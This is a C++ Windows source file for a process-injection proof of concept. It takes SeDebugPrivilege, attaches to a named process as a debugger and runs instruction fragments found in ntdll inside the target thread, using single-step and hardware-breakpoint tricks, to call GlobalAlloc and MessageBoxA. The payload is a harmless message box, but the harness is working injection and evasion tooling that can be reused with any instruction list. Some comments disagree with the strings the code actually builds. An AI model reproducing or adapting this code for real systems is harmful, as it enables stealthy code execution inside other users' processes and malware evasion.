#include <stdio.h>
#include <windows.h>
#include <string>
#include <tlhelp32.h>
#include <processthreadsapi.h>

#define FLAG_EAX 0x00000001
#define FLAG_EBX 0x00000002
#define FLAG_ECX 0x00000004
#define FLAG_EDX 0x00000008
#define FLAG_EDI 0x00000010
#define FLAG_ESI 0x00000020
#define FLAG_CALL 0x00000040

struct InstructionEntryStruct
{
	const char* pLabel;

	BYTE bInstruction[16];
	DWORD dwInstructionLength;

	DWORD dwInstructionAddr;

	DWORD dwEax;
	DWORD dwEbx;
	DWORD dwEcx;
	DWORD dwEdx;
	DWORD dwEdi;
	DWORD dwEsi;
	DWORD dwInstructionFlags;
};

DWORD dwGlobal_CurrInstruction = 0;
CONTEXT Global_OrigContext;
DWORD targetThread = 0;
HANDLE hTargetThread;

DWORD FindProcessId(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}

BOOL AdjustPrivileges() {
	BOOL bRet = FALSE;
	HANDLE hToken = NULL;
	LUID luid = { 0 };

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
		{
			TOKEN_PRIVILEGES tokenPriv = { 0 };
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luid;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
		}
	}

	return bRet;
}

InstructionEntryStruct Global_InstructionList[] =
{
	// allocate 1kb buffer for messagebox title using GlobalAlloc
	{ "push ecx", { 0x51 }, 1, 0, 0, 0, 1024, 0, 0, 0, FLAG_ECX },
	{ "push ecx", { 0x51 }, 1, 0, 0, 0, GMEM_FIXED, 0, 0, 0, FLAG_ECX },
	{ "call eax ; (GlobalAlloc)", { 0xFF, 0xD0 }, 2, 0, (DWORD)GlobalAlloc, 0, 0, 0, 0, 0, FLAG_EAX | FLAG_CALL },

	// set messagebox title to "www.x86matthew.com"
	{ "mov ebx, eax", { 0x8B, 0xD8 }, 2, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 'I' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 'I', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 't' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 't', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: ' ' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, ' ', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 'w' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 'w', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 'o' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 'o', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 'r' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 'r', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 'k' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 'k', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 's' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 's', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; (null) ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, '\0', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },

	// store messagebox title ptr in edi register
	{ "mov edi, eax", { 0x8B, 0xF8 }, 2, 0, 0, 0, 0, 0, 0, 0, 0 },

	// allocate 1kb buffer for messagebox text using GlobalAlloc
	{ "push ecx", { 0x51 }, 1, 0, 0, 0, 1024, 0, 0, 0, FLAG_ECX },
	{ "push ecx", { 0x51 }, 1, 0, 0, 0, GMEM_FIXED, 0, 0, 0, FLAG_ECX },
	{ "call eax ; (GlobalAlloc)", { 0xFF, 0xD0 }, 2, 0, (DWORD)GlobalAlloc, 0, 0, 0, 0, 0, FLAG_EAX | FLAG_CALL },

	// set messagebox text to "Maff1t"
	{ "mov ebx, eax", { 0x8B, 0xD8 }, 2, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 'n' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 'n', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 't' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 't', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 'd' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 'd', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 'l' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 'l', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; character: 'l' ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, 'l', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "mov byte ptr [ebx], dl ; (null) ", { 0x88, 0x13 }, 2, 0, 0, 0, 0, '\0', 0, 0, FLAG_EDX },
	{ "inc ebx", { 0x43 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },

	// call MessageBoxA
	{ "push ecx", { 0x51 }, 1, 0, 0, 0, MB_OK, 0, 0, 0, FLAG_ECX },
	{ "push edi", { 0x57 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "push eax", { 0x50 }, 1, 0, 0, 0, 0, 0, 0, 0, 0 },
	{ "push ecx", { 0x51 }, 1, 0, 0, 0, 0, 0, 0, 0, FLAG_ECX },
	{ "call eax ; (MessageBoxA)", { 0xFF, 0xD0 }, 2, 0, (DWORD)MessageBoxA, 0, 0, 0, 0, 0, FLAG_EAX | FLAG_CALL },
};

DWORD GetModuleCodeSection(DWORD dwModuleBase, DWORD* pdwCodeSectionStart, DWORD* pdwCodeSectionLength)
{
	IMAGE_DOS_HEADER* pDosHeader = NULL;
	IMAGE_NT_HEADERS* pNtHeader = NULL;
	IMAGE_SECTION_HEADER* pCurrSectionHeader = NULL;
	char szCurrSectionName[16];
	DWORD dwFound = 0;
	DWORD dwCodeSectionStart = 0;
	DWORD dwCodeSectionLength = 0;

	// get dos header ptr (start of module)
	pDosHeader = (IMAGE_DOS_HEADER*)dwModuleBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return 1;
	}

	// get nt header ptr
	pNtHeader = (IMAGE_NT_HEADERS*)((BYTE*)pDosHeader + pDosHeader->e_lfanew);
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		return 1;
	}

	// loop through all sections
	for (DWORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)
	{
		// get current section header
		pCurrSectionHeader = (IMAGE_SECTION_HEADER*)((BYTE*)pNtHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		// pCurrSectionHeader->Name is not null terminated if all 8 characters are used - copy it to a larger local buffer
		memset(szCurrSectionName, 0, sizeof(szCurrSectionName));
		memcpy(szCurrSectionName, pCurrSectionHeader->Name, sizeof(pCurrSectionHeader->Name));

		// check if this is the main code section
		if (strcmp(szCurrSectionName, ".text") == 0)
		{
			// found code section
			dwFound = 1;
			dwCodeSectionStart = dwModuleBase + pCurrSectionHeader->VirtualAddress;
			dwCodeSectionLength = pCurrSectionHeader->SizeOfRawData;

			break;
		}
	}

	// ensure the code section was found
	if (dwFound == 0)
	{
		return 1;
	}

	// store values
	*pdwCodeSectionStart = dwCodeSectionStart;
	*pdwCodeSectionLength = dwCodeSectionLength;

	return 0;
}

DWORD ScanForInstructions()
{
	DWORD dwInstructionCount = 0;
	DWORD dwCurrSearchPos = 0;
	DWORD dwBytesRemaining = 0;
	DWORD dwFoundAddr = 0;
	DWORD dwCodeSectionStart = 0;
	DWORD dwCodeSectionLength = 0;

	// calculate instruction count
	dwInstructionCount = sizeof(Global_InstructionList) / sizeof(Global_InstructionList[0]);

	// find ntdll code section range
	if (GetModuleCodeSection((DWORD)GetModuleHandleW(L"ntdll.dll"), &dwCodeSectionStart, &dwCodeSectionLength) != 0)
	{
		return 1;
	}

	// scan for instructions
	for (DWORD i = 0; i < dwInstructionCount; i++)
	{
		// check if an address has already been found for this instruction
		if (Global_InstructionList[i].dwInstructionAddr != 0)
		{
			continue;
		}

		// find this instruction in the ntdll code section
		dwCurrSearchPos = dwCodeSectionStart;
		dwBytesRemaining = dwCodeSectionLength;
		dwFoundAddr = 0;
		for (;;)
		{
			// check if the end of the code section has been reached
			if (Global_InstructionList[i].dwInstructionLength > dwBytesRemaining)
			{
				break;
			}

			// check if the instruction exists here
			if (memcmp((void*)dwCurrSearchPos, (void*)Global_InstructionList[i].bInstruction, Global_InstructionList[i].dwInstructionLength) == 0)
			{
				dwFoundAddr = dwCurrSearchPos;
				break;
			}

			// update search indexes
			dwCurrSearchPos++;
			dwBytesRemaining--;
		}

		// ensure the opcode was found
		if (dwFoundAddr == 0)
		{
			printf("Error: Instruction not found in ntdll: '%s'\n", Global_InstructionList[i].pLabel);

			return 1;
		}

		// store address
		Global_InstructionList[i].dwInstructionAddr = dwFoundAddr;

		// copy this instruction address to any other matching instructions in the list
		for (DWORD ii = 0; ii < dwInstructionCount; ii++)
		{
			// check if the instruction lengths match
			if (Global_InstructionList[ii].dwInstructionLength == Global_InstructionList[i].dwInstructionLength)
			{
				// check if the instruction opcodes match
				if (memcmp(Global_InstructionList[ii].bInstruction, Global_InstructionList[i].bInstruction, Global_InstructionList[i].dwInstructionLength) == 0)
				{
					// copy instruction address
					Global_InstructionList[ii].dwInstructionAddr = Global_InstructionList[i].dwInstructionAddr;
				}
			}
		}
	}

	return 0;
}

void DebuggerMainLoop() {
	DEBUG_EVENT DBEvent;
	LPDEBUG_EVENT DebugEv = &DBEvent;
	CONTEXT currentContext;
	for (;;)
	{
		WaitForDebugEvent(DebugEv, INFINITE);
		if (targetThread == DebugEv->dwThreadId)

		if (DebugEv->dwDebugEventCode == CREATE_THREAD_DEBUG_EVENT) {
			printf("This event is fired for every thread resumed %d\n", DebugEv->dwThreadId);
		}


		// Check if the event comes from the monitored thread
		// and if the exeception is STEP or BREAKPOINT
		if (DebugEv->dwDebugEventCode != EXCEPTION_DEBUG_EVENT) {
			ContinueDebugEvent(DebugEv->dwProcessId, DebugEv->dwThreadId, DBG_CONTINUE);
			continue;
		}

		if (targetThread == 0) {
			targetThread = DebugEv->dwThreadId;
			hTargetThread = OpenThread(THREAD_ALL_ACCESS, false, targetThread);
			GetThreadContext(hTargetThread, &Global_OrigContext);
		}

		// Now we know that the target thread has raised a breakpoint/single-step exception
		InstructionEntryStruct* pCurrInstruction = NULL;
		hTargetThread = OpenThread(THREAD_ALL_ACCESS, false, targetThread);
		if (!GetThreadContext(hTargetThread, &currentContext)) {
			printf("Unable to get thread context");
			break;
		}

		printf("EIP: %p\t EAX: %x\n", currentContext.Eip, currentContext.Eax);

		if (dwGlobal_CurrInstruction >= (sizeof(Global_InstructionList) / sizeof(Global_InstructionList[0])))
		{
			// finished executing all instructions - restore original context
			printf("We have finished, let's restore the old context\n\n");
			SetThreadContext(hTargetThread, &Global_OrigContext);
			break;
		}

		// get current instruction entry
		pCurrInstruction = &Global_InstructionList[dwGlobal_CurrInstruction];

		// set instruction ptr to next instruction
		currentContext.Eip = pCurrInstruction->dwInstructionAddr;

		// check register flags
		if (pCurrInstruction->dwInstructionFlags & FLAG_EAX)
		{
			// set eax
			printf("<Debugger> mov eax, 0x%x\n", pCurrInstruction->dwEax);
			currentContext.Eax = pCurrInstruction->dwEax;
		}
		else if (pCurrInstruction->dwInstructionFlags & FLAG_EBX)
		{
			// set ebx
			printf("<Debugger> mov ebx, 0x%x\n", pCurrInstruction->dwEbx);
			currentContext.Ebx = pCurrInstruction->dwEbx;
		}
		else if (pCurrInstruction->dwInstructionFlags & FLAG_ECX)
		{
			// set ecx
			printf("<Debugger> mov ecx, 0x%x\n", pCurrInstruction->dwEcx);
			currentContext.Ecx = pCurrInstruction->dwEcx;
		}
		else if (pCurrInstruction->dwInstructionFlags & FLAG_EDX)
		{
			// set edx
			printf("<Debugger> mov edx, 0x%x\n", pCurrInstruction->dwEdx);
			currentContext.Edx = pCurrInstruction->dwEdx;
		}
		else if (pCurrInstruction->dwInstructionFlags & FLAG_EDI)
		{
			// set edi
			printf("<Debugger> mov edi, 0x%x\n", pCurrInstruction->dwEdi);
			currentContext.Edi = pCurrInstruction->dwEdi;
		}
		else if (pCurrInstruction->dwInstructionFlags & FLAG_ESI)
		{
			// set esi
			printf("<Debugger> mov esi, 0x%x\n", pCurrInstruction->dwEsi);
			currentContext.Esi = pCurrInstruction->dwEsi;
		}

		// print current instruction label
		printf("<ntdll: 0x%08X> %s\n", pCurrInstruction->dwInstructionAddr, pCurrInstruction->pLabel);

		// check if this is a 'call' instruction
		if (pCurrInstruction->dwInstructionFlags & FLAG_CALL)
		{
			// set a hardware breakpoint on the first instruction after the 'call'
			currentContext.Dr0 = pCurrInstruction->dwInstructionAddr + pCurrInstruction->dwInstructionLength;
			currentContext.Dr7 = 1;
		}
		else
		{
			// single step
			currentContext.EFlags |= 0x100;
		}

		// move to the next instruction
		dwGlobal_CurrInstruction++;

		if (!SetThreadContext(hTargetThread, &currentContext)) {
			printf("Unable to set thread context");
			break;
		}

		// continue execution
		ContinueDebugEvent(DebugEv->dwProcessId, DebugEv->dwThreadId, DBG_CONTINUE);
		CloseHandle(hTargetThread);
	}

	system("pause");
}

int main(int argc, char** argv)
{

	if (argc < 2) {
		printf("Usage: %s [processToInject]", argv[0]);
		exit(1);
	}

	printf("[+] Getting seDebugPrivilege\n");
	if (!AdjustPrivileges()) {
		printf("[-] Unable to get privileges");
		exit(1);
	}


	std::string processToInject(argv[1]);
	std::wstring ws(processToInject.begin(), processToInject.end());
	DWORD targetPid = FindProcessId(ws);

	if (targetPid == 0) {
		printf("[-] Unable to find target Pid");
		exit(1);
	}

	printf("[+] Scanning ntdll to populate instruction list...\n");

	// scan for instructions
	if (ScanForInstructions() != 0)
	{
		printf("[-] Failed ScanForInstructions");
		exit(1);
	}

	printf("[+] Attaching to %s as a debugger\n", argv[1]);

	if (!DebugActiveProcess(targetPid)) {
		printf("[-] Unable to attach the target process (verify privileges)");
		exit(1);
	}

	DebuggerMainLoop();

	DebugActiveProcessStop(targetPid);
	CloseHandle(hTargetThread);
	printf("\nFinished\n");

	return 0;
}